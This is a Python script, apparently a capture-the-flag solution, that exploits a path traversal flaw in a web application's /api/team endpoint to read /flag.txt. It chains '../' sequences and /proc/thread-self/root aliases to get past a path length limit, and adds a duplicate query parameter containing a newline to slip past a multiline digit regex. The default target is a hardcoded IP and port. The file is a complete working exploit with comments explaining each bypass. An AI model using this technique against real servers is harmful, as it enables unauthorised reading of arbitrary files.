#!/usr/bin/env python3
import sys
import urllib.error
import urllib.parse
import urllib.request


def exploit(base_url: str) -> bytes:
    # The first value makes the path exactly 100 bytes long at /flag.txt.
    # The second makes /^[0-9]+$/m pass after the array is stringified.
    # /proc/thread-self/root is a real alias for /. Repeating it keeps enough
    # characters after path.join() normalization for slice(0, 100) to matter.
    traversal = (
        "../" * 17
        + "proc/thread-self/root/proc/thread-self/root/flag.txt"
    )
    query = urllib.parse.urlencode([("id", traversal), ("id", "\n1")])
    url = base_url.rstrip("/") + "/api/team?" + query

    with urllib.request.urlopen(url, timeout=10) as response:
        return response.read()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.65:31644"
    try:
        print(exploit(target).decode())
    except urllib.error.HTTPError as exc:
        print(f"HTTP {exc.code}: {exc.read().decode(errors='replace')}", file=sys.stderr)
        raise SystemExit(1)
